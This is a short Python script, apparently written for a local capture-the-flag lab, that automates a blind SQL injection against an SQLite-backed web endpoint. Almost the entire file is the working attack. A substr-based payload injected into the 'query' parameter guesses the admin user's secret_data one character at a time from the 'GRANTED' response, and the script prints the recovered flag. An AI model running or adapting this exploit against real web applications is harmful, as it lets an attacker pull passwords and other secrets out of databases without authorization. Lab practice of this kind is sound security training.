import requests
import string
import sys

# TARGET CONFIGURATION
# Make sure this matches the port your Lab 3 is running on (8083)
URL = "http://127.0.0.1:8083/check"

# THE CHARACTERS TO GUESS
# We check letters, numbers, and special CTF characters like { } _ !
CHARSET = string.ascii_letters + string.digits + "{}_!"

def attack():
    print(f"[*] Target locked: {URL}")
    print("[*] Initiating Blind SQL Injection extraction...")
    
    flag = ""
    position = 1
    
    while True:
        found_char = False
        
        for char in CHARSET:
            # THE PAYLOAD
            # Logic: "If the character at position [X] is [Y], return True (GRANTED)"
            # We use 'substr' because the DB is SQLite.
            payload = f"admin' AND substr((SELECT secret_data FROM users WHERE username='admin'), {position}, 1) = '{char}' --"
            
            try:
                # Send the question to the Oracle
                r = requests.get(URL, params={'query': payload})
                
                # Check the response text for the "Success" indicator
                # In your code, a success returns the word "GRANTED"
                if "GRANTED" in r.text:
                    flag += char
                    sys.stdout.write(char) # Print character immediately
                    sys.stdout.flush()
                    
                    found_char = True
                    position += 1
                    
                    # Stop if we hit the closing bracket
                    if char == "}":
                        print(f"\n\n[+] SYSTEM COMPROMISED. Flag: {flag}")
                        return
                    break
            
            except Exception as e:
                print(f"\n[!] Error: {e}")
                return

        if not found_char:
            print("\n[!] Extraction stopped. (Character not in charset or end of string)")
            break

if __name__ == "__main__":
    attack()
